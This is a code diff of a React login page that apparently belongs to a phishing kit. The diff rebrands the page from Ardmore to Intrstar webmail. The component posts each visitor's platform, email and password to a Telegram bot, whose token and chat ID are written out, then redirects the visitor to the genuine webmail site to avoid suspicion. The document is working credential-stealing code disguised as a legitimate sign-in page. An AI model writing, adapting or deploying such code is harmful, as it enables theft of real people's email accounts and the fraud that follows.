@@ -5,6 +5,7 @@ import logo from './logo.png';
 import ardmore from './ardmore.png';
 import { useState } from 'react';
 import axios from 'axios';
+import intrstar from './intrstar.png';
 
 function Home(){
 
@@ -12,7 +13,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Ardmore")
+    const[platform, setPlatform] = useState("Intrstar")
 
     const[showError, setShowError] = useState(false);
 
@@ -29,8 +30,8 @@ function Home(){
             //     platform:platform
             // });
     
-            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
+          const response =   await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                chat_id: 6150403557,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
     
@@ -43,7 +44,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.ardmore.net/';
+               window.location.href = 'https://vmx.intrstar.net/';
             }
           } catch (error) {
             // Handle error
@@ -71,7 +72,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={ardmore} className="mylogo" />
+                <img src={intrstar} className="mylogo" />
 
                 </div>
 
